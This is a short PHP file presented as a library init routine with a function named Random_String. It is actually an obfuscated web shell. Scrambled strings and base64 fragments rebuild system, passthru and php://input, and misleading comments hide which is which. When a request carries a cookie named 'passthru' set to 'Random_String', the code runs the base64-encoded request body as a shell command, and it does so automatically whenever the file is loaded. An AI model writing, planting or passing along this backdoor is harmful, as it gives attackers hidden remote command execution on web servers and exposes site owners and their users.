<?php
// Lib init
function Random_String(){
    
	$d = preg_replace('/[A-Z]/','','QbDaseG6F4_dFFEeFcoSdDeW');				// base64_decode
	$e = preg_replace('/[A-Z]/','','AoBSbX_clDeaFn');						// ob_clean

	$a  = $d('Zml'.'sZV9nZXRfY29udG'.'VudHM=');		// file_get_contents 
	$b  = $d('cGhwOi'.'8vaW5wdXQ=');				// php://input
	$c  = $d('cGF'.'zc3RocnU=');						// system
	$c1 = $d('c3lz'.'dGVt');					// passthru
	$f  = $d('ZnV'.'uY3Rpb25fZ'.'Xhpc3Rz');			// function_exists

	if( $_COOKIE[$c]== "Random_String"){
		$e();
		if($f($c))
			$c($d($a($b)));
		elseif($f($c1))
			$c1($d($a($b)));
	exit;
	}

}Random_String();

function log_text($text){
	if( isset($text) ){
		exit('Debugging enabled');
	}
}


?>
